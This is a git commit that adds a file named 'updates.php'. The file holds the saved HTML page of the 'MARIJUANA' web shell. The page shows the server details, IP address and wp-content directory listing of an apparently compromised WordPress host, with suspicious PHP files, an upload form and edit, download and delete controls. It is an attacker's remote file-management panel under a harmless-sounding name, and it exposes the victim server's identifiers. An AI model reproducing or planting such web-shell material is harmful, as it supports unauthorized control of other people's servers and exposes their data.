a2fbaa8d047e58f47443c519552a17c32a8a569c
Deinisme <114871586+Deinisme@users.noreply.github.com>
2023-06-03 23:08:51 +0700

    Add files via upload

---
+++ updates.php
@@ -0,0 +1,379 @@
+<!DOCTYPE html>
+	<html dir="auto" lang="en-US">
+
+		<head>
+			<meta charset="UTF-8">
+			<meta name="robots" content="NOINDEX, NOFOLLOW">
+
+				<title>MARIJUANA</title>
+
+			<link rel="icon" href="//0x5a455553.github.io/MARIJUANA/icon.png" />
+			<link rel="stylesheet" href="//0x5a455553.github.io/MARIJUANA/main.css" type="text/css">
+
+			<script src="//ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+			<script src="//cdnjs.cloudflare.com/ajax/libs/notify/0.4.2/notify.min.js"></script>
+		</head>
+
+		<body>
+			<header>
+				<div class="y x">
+					<a class="ajx" href="Flower.php">
+						MARIJuANA
+					</a>
+				</div>
+
+				<div class="q x w">
+					&#8212; DIOS &#8212; NO &#8212; CREA &#8212; NADA &#8212; EN &#8212; VANO &#8212;
+				</div>
+				
+			</header>
+
+			<article>
+				<div class="i">
+					<i class="far fa-hdd"></i>
+					Linux a2plcpnl0063.prod.iad2.secureserver.net 2.6.32-954.3.5.lve1.4.90.el6.x86_64 #1 SMP Tue Feb 21 12:26:30 UTC 2023 x86_64
+					<br />
+
+					<i class="far fa-lightbulb"></i> &thinsp;&thinsp;<b>SOFT  :</b> Apache <b>PHP :</b> 7.2.34
+					<br />
+
+					<i class="far fa-folder"></i>
+					
+					<a class="ajx" href="?d=2f">/</a><a class="ajx" href="?d=2f686f6d65">home</a>/<a class="ajx" href="?d=2f686f6d652f716f70646b6666316572626f">qopdkff1erbo</a>/<a class="ajx" href="?d=2f686f6d652f716f70646b6666316572626f2f7075626c69635f68746d6c">public_html</a>/<a class="ajx" href="?d=2f686f6d652f716f70646b6666316572626f2f7075626c69635f68746d6c2f77702d636f6e74656e74">wp-content</a>/
+					<br />
+
+				</div>
+
+				<div class="u">
+					107.180.2.112 <i class="fas fa-link"></i>
+					<br />
+
+					<br />
+
+					<form method="post" enctype="multipart/form-data">
+						<label class="l w">
+							<input type="file" name="n[]" onchange="this.form.submit()" multiple> &nbsp;UPLOAD
+						</label>&nbsp;
+					</form>
+
+					
+				</div>
+					<table cellspacing="0" cellpadding="7" width="100%">
+						<thead>
+							<tr>
+								<th width="44%">[ NAME ]</th>
+								<th width="11%">[ SIZE ]</th>
+								<th width="17%">[ PERM ]</th>
+								<th width="17%">[ DATE ]</th>
+								<th width="11%">[ ACT ]</th>
+							</tr>
+						</thead>
+						<tbody>
+							<tr>
+								<td>
+									<a class="ajx" href="?d=2f686f6d652f716f70646b6666316572626f2f7075626c69635f68746d6c2f77702d636f6e74656e74&n">+FILE</a>
+									<a class="ajx" href="?d=2f686f6d652f716f70646b6666316572626f2f7075626c69635f68746d6c2f77702d636f6e74656e74&l">+DIR</a>
+								</td>
+							</tr>
+						<tr class="r">
+							<td>
+								<i class="far fa-folder m"></i>
+								<a class="ajx" href="?d=2f686f6d652f716f70646b6666316572626f2f7075626c69635f68746d6c2f77702d636f6e74656e742f626c6f67732e646972">blogs.dir</a>
+							</td>
+							<td class="x">
+								dir
+							</td>
+							<td class="x">
+								<a class="ajx" href="?d=2f686f6d652f716f70646b6666316572626f2f7075626c69635f68746d6c2f77702d636f6e74656e74&k=626c6f67732e646972">drwxr-xr-x</a>
+							</td>
+							<td class="x">
+								<a class="ajx" href="?d=2f686f6d652f716f70646b6666316572626f2f7075626c69635f68746d6c2f77702d636f6e74656e74&t=626c6f67732e646972">2023-03-03 05:34</a>
+							</td>
+							<td class="x">
+								<a class="ajx" href="?d=2f686f6d652f716f70646b6666316572626f2f7075626c69635f68746d6c2f77702d636f6e74656e74&r=626c6f67732e646972">R</a>
+								<a href="?d=2f686f6d652f716f70646b6666316572626f2f7075626c69635f68746d6c2f77702d636f6e74656e74&x=626c6f67732e646972">D</a>
+							</td>
+						</tr>
+						
+						<tr class="r">
+							<td>
+								<i class="far fa-folder m"></i>
+								<a class="ajx" href="?d=2f686f6d652f716f70646b6666316572626f2f7075626c69635f68746d6c2f77702d636f6e74656e742f6c616e677561676573">languages</a>
+							</td>
+							<td class="x">
+								dir
+							</td>
+							<td class="x">
+								<a class="ajx" href="?d=2f686f6d652f716f70646b6666316572626f2f7075626c69635f68746d6c2f77702d636f6e74656e74&k=6c616e677561676573">drwxr-xr-x</a>
+							</td>
+							<td class="x">
+								<a class="ajx" href="?d=2f686f6d652f716f70646b6666316572626f2f7075626c69635f68746d6c2f77702d636f6e74656e74&t=6c616e677561676573">2023-03-03 05:34</a>
+							</td>
+							<td class="x">
+								<a class="ajx" href="?d=2f686f6d652f716f70646b6666316572626f2f7075626c69635f68746d6c2f77702d636f6e74656e74&r=6c616e677561676573">R</a>
+								<a href="?d=2f686f6d652f716f70646b6666316572626f2f7075626c69635f68746d6c2f77702d636f6e74656e74&x=6c616e677561676573">D</a>
+							</td>
+						</tr>
+						
+						<tr class="r">
+							<td>
+								<i class="far fa-folder m"></i>
+								<a class="ajx" href="?d=2f686f6d652f716f70646b6666316572626f2f7075626c69635f68746d6c2f77702d636f6e74656e742f6d752d706c7567696e73">mu-plugins</a>
+							</td>
+							<td class="x">
+								dir
+							</td>
+							<td class="x">
+								<a class="ajx" href="?d=2f686f6d652f716f70646b6666316572626f2f7075626c69635f68746d6c2f77702d636f6e74656e74&k=6d752d706c7567696e73">drwxr-xr-x</a>
+							</td>
+							<td class="x">
+								<a class="ajx" href="?d=2f686f6d652f716f70646b6666316572626f2f7075626c69635f68746d6c2f77702d636f6e74656e74&t=6d752d706c7567696e73">2023-03-03 05:34</a>
+							</td>
+							<td class="x">
+								<a class="ajx" href="?d=2f686f6d652f716f70646b6666316572626f2f7075626c69635f68746d6c2f77702d636f6e74656e74&r=6d752d706c7567696e73">R</a>
+								<a href="?d=2f686f6d652f716f70646b6666316572626f2f7075626c69635f68746d6c2f77702d636f6e74656e74&x=6d752d706c7567696e73">D</a>
+							</td>
+						</tr>
+						
+						<tr class="r">
+							<td>
+								<i class="far fa-folder m"></i>
+								<a class="ajx" href="?d=2f686f6d652f716f70646b6666316572626f2f7075626c69635f68746d6c2f77702d636f6e74656e742f706c7567696e73">plugins</a>
+							</td>
+							<td class="x">
+								dir
+							</td>
+							<td class="x">
+								<a class="ajx" href="?d=2f686f6d652f716f70646b6666316572626f2f7075626c69635f68746d6c2f77702d636f6e74656e74&k=706c7567696e73">drwxr-xr-x</a>
+							</td>
+							<td class="x">
+								<a class="ajx" href="?d=2f686f6d652f716f70646b6666316572626f2f7075626c69635f68746d6c2f77702d636f6e74656e74&t=706c7567696e73">2023-03-03 05:34</a>
+							</td>
+							<td class="x">
+								<a class="ajx" href="?d=2f686f6d652f716f70646b6666316572626f2f7075626c69635f68746d6c2f77702d636f6e74656e74&r=706c7567696e73">R</a>
+								<a href="?d=2f686f6d652f716f70646b6666316572626f2f7075626c69635f68746d6c2f77702d636f6e74656e74&x=706c7567696e73">D</a>
+							</td>
+						</tr>
+						
+						<tr class="r">
+							<td>
+								<i class="far fa-folder m"></i>
+								<a class="ajx" href="?d=2f686f6d652f716f70646b6666316572626f2f7075626c69635f68746d6c2f77702d636f6e74656e742f7468656d6573">themes</a>
+							</td>
+							<td class="x">
+								dir
+							</td>
+							<td class="x">
+								<a class="ajx" href="?d=2f686f6d652f716f70646b6666316572626f2f7075626c69635f68746d6c2f77702d636f6e74656e74&k=7468656d6573">drwxr-xr-x</a>
+							</td>
+							<td class="x">
+								<a class="ajx" href="?d=2f686f6d652f716f70646b6666316572626f2f7075626c69635f68746d6c2f77702d636f6e74656e74&t=7468656d6573">2023-03-03 05:34</a>
+							</td>
+							<td class="x">
+								<a class="ajx" href="?d=2f686f6d652f716f70646b6666316572626f2f7075626c69635f68746d6c2f77702d636f6e74656e74&r=7468656d6573">R</a>
+								<a href="?d=2f686f6d652f716f70646b6666316572626f2f7075626c69635f68746d6c2f77702d636f6e74656e74&x=7468656d6573">D</a>
+							</td>
+						</tr>
+						
+						<tr class="r">
+							<td>
+								<i class="far fa-folder m"></i>
+								<a class="ajx" href="?d=2f686f6d652f716f70646b6666316572626f2f7075626c69635f68746d6c2f77702d636f6e74656e742f75706772616465">upgrade</a>
+							</td>
+							<td class="x">
+								dir
+							</td>
+							<td class="x">
+								<a class="ajx" href="?d=2f686f6d652f716f70646b6666316572626f2f7075626c69635f68746d6c2f77702d636f6e74656e74&k=75706772616465">drwxr-xr-x</a>
+							</td>
+							<td class="x">
+								<a class="ajx" href="?d=2f686f6d652f716f70646b6666316572626f2f7075626c69635f68746d6c2f77702d636f6e74656e74&t=75706772616465">2023-03-11 08:39</a>
+							</td>
+							<td class="x">
+								<a class="ajx" href="?d=2f686f6d652f716f70646b6666316572626f2f7075626c69635f68746d6c2f77702d636f6e74656e74&r=75706772616465">R</a>
+								<a href="?d=2f686f6d652f716f70646b6666316572626f2f7075626c69635f68746d6c2f77702d636f6e74656e74&x=75706772616465">D</a>
+							</td>
+						</tr>
+						
+						<tr class="r">
+							<td>
+								<i class="far fa-folder m"></i>
+								<a class="ajx" href="?d=2f686f6d652f716f70646b6666316572626f2f7075626c69635f68746d6c2f77702d636f6e74656e742f75706c6f616473">uploads</a>
+							</td>
+							<td class="x">
+								dir
+							</td>
+							<td class="x">
+								<a class="ajx" href="?d=2f686f6d652f716f70646b6666316572626f2f7075626c69635f68746d6c2f77702d636f6e74656e74&k=75706c6f616473">drwxr-xr-x</a>
+							</td>
+							<td class="x">
+								<a class="ajx" href="?d=2f686f6d652f716f70646b6666316572626f2f7075626c69635f68746d6c2f77702d636f6e74656e74&t=75706c6f616473">2023-03-11 08:39</a>
+							</td>
+							<td class="x">
+								<a class="ajx" href="?d=2f686f6d652f716f70646b6666316572626f2f7075626c69635f68746d6c2f77702d636f6e74656e74&r=75706c6f616473">R</a>
+								<a href="?d=2f686f6d652f716f70646b6666316572626f2f7075626c69635f68746d6c2f77702d636f6e74656e74&x=75706c6f616473">D</a>
+							</td>
+						</tr>
+						
+						<tr class="r">
+							<td>
+								<i class="far fa-file m"></i>&thinsp;
+								<a class="ajx" href="?d=2f686f6d652f716f70646b6666316572626f2f7075626c69635f68746d6c2f77702d636f6e74656e74&s=5175345a795639505262662e706870">Qu4ZyV9PRbf.php</a>
+							</td>
+							<td class="x">
+								166.769 KB
+							</td>
+							<td class="x">
+								<a class="ajx" href="?d=2f686f6d652f716f70646b6666316572626f2f7075626c69635f68746d6c2f77702d636f6e74656e74&k=5175345a795639505262662e706870">-rw-r--r--</a>
+							</td>
+							<td class="x">
+								<a class="ajx" href="?d=2f686f6d652f716f70646b6666316572626f2f7075626c69635f68746d6c2f77702d636f6e74656e74&t=5175345a795639505262662e706870">2023-03-02 01:51</a>
+							</td>
+							<td class="x">
+								<a class="ajx" href="?d=2f686f6d652f716f70646b6666316572626f2f7075626c69635f68746d6c2f77702d636f6e74656e74&r=5175345a795639505262662e706870">R</a>
+								<a class="ajx" href="?d=2f686f6d652f716f70646b6666316572626f2f7075626c69635f68746d6c2f77702d636f6e74656e74&e=5175345a795639505262662e706870">E</a>
+								<a href="?d=2f686f6d652f716f70646b6666316572626f2f7075626c69635f68746d6c2f77702d636f6e74656e74&g=5175345a795639505262662e706870">G</a>
+								
+								<a href="?d=2f686f6d652f716f70646b6666316572626f2f7075626c69635f68746d6c2f77702d636f6e74656e74&x=5175345a795639505262662e706870">D</a>
+							</td>
+						</tr>
+						
+						<tr class="r">
+							<td>
+								<i class="far fa-file m"></i>&thinsp;
+								<a class="ajx" href="?d=2f686f6d652f716f70646b6666316572626f2f7075626c69635f68746d6c2f77702d636f6e74656e74&s=61646d696e2e706870">admin.php</a>
+							</td>
+							<td class="x">
+								46.173 KB
+							</td>
+							<td class="x">
+								<a class="ajx" href="?d=2f686f6d652f716f70646b6666316572626f2f7075626c69635f68746d6c2f77702d636f6e74656e74&k=61646d696e2e706870">-rw-r--r--</a>
+							</td>
+							<td class="x">
+								<a class="ajx" href="?d=2f686f6d652f716f70646b6666316572626f2f7075626c69635f68746d6c2f77702d636f6e74656e74&t=61646d696e2e706870">2023-02-27 07:28</a>
+							</td>
+							<td class="x">
+								<a class="ajx" href="?d=2f686f6d652f716f70646b6666316572626f2f7075626c69635f68746d6c2f77702d636f6e74656e74&r=61646d696e2e706870">R</a>
+								<a class="ajx" href="?d=2f686f6d652f716f70646b6666316572626f2f7075626c69635f68746d6c2f77702d636f6e74656e74&e=61646d696e2e706870">E</a>
+								<a href="?d=2f686f6d652f716f70646b6666316572626f2f7075626c69635f68746d6c2f77702d636f6e74656e74&g=61646d696e2e706870">G</a>
+								
+								<a href="?d=2f686f6d652f716f70646b6666316572626f2f7075626c69635f68746d6c2f77702d636f6e74656e74&x=61646d696e2e706870">D</a>
+							</td>
+						</tr>
+						
+						<tr class="r">
+							<td>
+								<i class="far fa-file m"></i>&thinsp;
+								<a class="ajx" href="?d=2f686f6d652f716f70646b6666316572626f2f7075626c69635f68746d6c2f77702d636f6e74656e74&s=636c6173732d696d616769636b2d637573746f6d697a652d656e636f64696e672e706870">class-imagick-customize-encoding.php</a>
+							</td>
+							<td class="x">
+								1.66 KB
+							</td>
+							<td class="x">
+								<a class="ajx" href="?d=2f686f6d652f716f70646b6666316572626f2f7075626c69635f68746d6c2f77702d636f6e74656e74&k=636c6173732d696d616769636b2d637573746f6d697a652d656e636f64696e672e706870">-rw-r--r--</a>
+							</td>
+							<td class="x">
+								<a class="ajx" href="?d=2f686f6d652f716f70646b6666316572626f2f7075626c69635f68746d6c2f77702d636f6e74656e74&t=636c6173732d696d616769636b2d637573746f6d697a652d656e636f64696e672e706870">2022-09-26 04:00</a>
+							</td>
+							<td class="x">
+								<a class="ajx" href="?d=2f686f6d652f716f70646b6666316572626f2f7075626c69635f68746d6c2f77702d636f6e74656e74&r=636c6173732d696d616769636b2d637573746f6d697a652d656e636f64696e672e706870">R</a>
+								<a class="ajx" href="?d=2f686f6d652f716f70646b6666316572626f2f7075626c69635f68746d6c2f77702d636f6e74656e74&e=636c6173732d696d616769636b2d637573746f6d697a652d656e636f64696e672e706870">E</a>
+								<a href="?d=2f686f6d652f716f70646b6666316572626f2f7075626c69635f68746d6c2f77702d636f6e74656e74&g=636c6173732d696d616769636b2d637573746f6d697a652d656e636f64696e672e706870">G</a>
+								
+								<a href="?d=2f686f6d652f716f70646b6666316572626f2f7075626c69635f68746d6c2f77702d636f6e74656e74&x=636c6173732d696d616769636b2d637573746f6d697a652d656e636f64696e672e706870">D</a>
+							</td>
+						</tr>
+						
+						<tr class="r">
+							<td>
+								<i class="far fa-file m"></i>&thinsp;
+								<a class="ajx" href="?d=2f686f6d652f716f70646b6666316572626f2f7075626c69635f68746d6c2f77702d636f6e74656e74&s=696e6465782e706870">index.php</a>
+							</td>
+							<td class="x">
+								0.027 KB
+							</td>
+							<td class="x">
+								<a class="ajx" href="?d=2f686f6d652f716f70646b6666316572626f2f7075626c69635f68746d6c2f77702d636f6e74656e74&k=696e6465782e706870">-rw-r--r--</a>
+							</td>
+							<td class="x">
+								<a class="ajx" href="?d=2f686f6d652f716f70646b6666316572626f2f7075626c69635f68746d6c2f77702d636f6e74656e74&t=696e6465782e706870">2012-01-08 17:01</a>
+							</td>
+							<td class="x">
+								<a class="ajx" href="?d=2f686f6d652f716f70646b6666316572626f2f7075626c69635f68746d6c2f77702d636f6e74656e74&r=696e6465782e706870">R</a>
+								<a class="ajx" href="?d=2f686f6d652f716f70646b6666316572626f2f7075626c69635f68746d6c2f77702d636f6e74656e74&e=696e6465782e706870">E</a>
+								<a href="?d=2f686f6d652f716f70646b6666316572626f2f7075626c69635f68746d6c2f77702d636f6e74656e74&g=696e6465782e706870">G</a>
+								
+								<a href="?d=2f686f6d652f716f70646b6666316572626f2f7075626c69635f68746d6c2f77702d636f6e74656e74&x=696e6465782e706870">D</a>
+							</td>
+						</tr>
+						
+						<tr class="r">
+							<td>
+								<i class="far fa-file m"></i>&thinsp;
+								<a class="ajx" href="?d=2f686f6d652f716f70646b6666316572626f2f7075626c69635f68746d6c2f77702d636f6e74656e74&s=6d616b6d616e2e706870">makman.php</a>
+							</td>
+							<td class="x">
+								0.675 KB
+							</td>
+							<td class="x">
+								<a class="ajx" href="?d=2f686f6d652f716f70646b6666316572626f2f7075626c69635f68746d6c2f77702d636f6e74656e74&k=6d616b6d616e2e706870">-rw-r--r--</a>
+							</td>
+							<td class="x">
+								<a class="ajx" href="?d=2f686f6d652f716f70646b6666316572626f2f7075626c69635f68746d6c2f77702d636f6e74656e74&t=6d616b6d616e2e706870">2023-03-11 13:54</a>
+							</td>
+							<td class="x">
+								<a class="ajx" href="?d=2f686f6d652f716f70646b6666316572626f2f7075626c69635f68746d6c2f77702d636f6e74656e74&r=6d616b6d616e2e706870">R</a>
+								<a class="ajx" href="?d=2f686f6d652f716f70646b6666316572626f2f7075626c69635f68746d6c2f77702d636f6e74656e74&e=6d616b6d616e2e706870">E</a>
+								<a href="?d=2f686f6d652f716f70646b6666316572626f2f7075626c69635f68746d6c2f77702d636f6e74656e74&g=6d616b6d616e2e706870">G</a>
+								
+								<a href="?d=2f686f6d652f716f70646b6666316572626f2f7075626c69635f68746d6c2f77702d636f6e74656e74&x=6d616b6d616e2e706870">D</a>
+							</td>
+						</tr>
+						
+						<tr class="r">
+							<td>
+								<i class="far fa-file m"></i>&thinsp;
+								<a class="ajx" href="?d=2f686f6d652f716f70646b6666316572626f2f7075626c69635f68746d6c2f77702d636f6e74656e74&s=7068702e696e69">php.ini</a>
+							</td>
+							<td class="x">
+								0.103 KB
+							</td>
+							<td class="x">
+								<a class="ajx" href="?d=2f686f6d652f716f70646b6666316572626f2f7075626c69635f68746d6c2f77702d636f6e74656e74&k=7068702e696e69">-rw-r--r--</a>
+							</td>
+							<td class="x">
+								<a class="ajx" href="?d=2f686f6d652f716f70646b6666316572626f2f7075626c69635f68746d6c2f77702d636f6e74656e74&t=7068702e696e69">2023-03-02 01:51</a>
+							</td>
+							<td class="x">
+								<a class="ajx" href="?d=2f686f6d652f716f70646b6666316572626f2f7075626c69635f68746d6c2f77702d636f6e74656e74&r=7068702e696e69">R</a>
+								<a class="ajx" href="?d=2f686f6d652f716f70646b6666316572626f2f7075626c69635f68746d6c2f77702d636f6e74656e74&e=7068702e696e69">E</a>
+								<a href="?d=2f686f6d652f716f70646b6666316572626f2f7075626c69635f68746d6c2f77702d636f6e74656e74&g=7068702e696e69">G</a>
+								
+								<a href="?d=2f686f6d652f716f70646b6666316572626f2f7075626c69635f68746d6c2f77702d636f6e74656e74&x=7068702e696e69">D</a>
+							</td>
+						</tr>
+						
+						</tbody>
+						<tfoot>
+							<tr>
+								<th class="et">
+									<a class="ajx" href="?d=2f686f6d652f716f70646b6666316572626f2f7075626c69635f68746d6c2f77702d636f6e74656e74&y">REQUEST</a>
+									<a href="?d=2f686f6d652f716f70646b6666316572626f2f7075626c69635f68746d6c2f77702d636f6e74656e74&q">EXIT</a>
+								</th>
+								<th class="et" width="11%"></th>
+								<th class="et" width="17%"></th>
+								<th class="et" width="17%"></th>
+								<th class="et" width="11%"></th>
+							</tr>
+					</tfoot>
+				</table>
+			</article>
+			<footer class="x">
+				&copy;TheAlmightyZeus
+			</footer>
+			
+			<script>
+				$(".ajx").click(function(t){t.preventDefault();var e=$(this).attr("href");history.pushState("","",e),$.get(e,function(t){$("body").html(t)})});
+			</script>
+		</body>
+	</html>
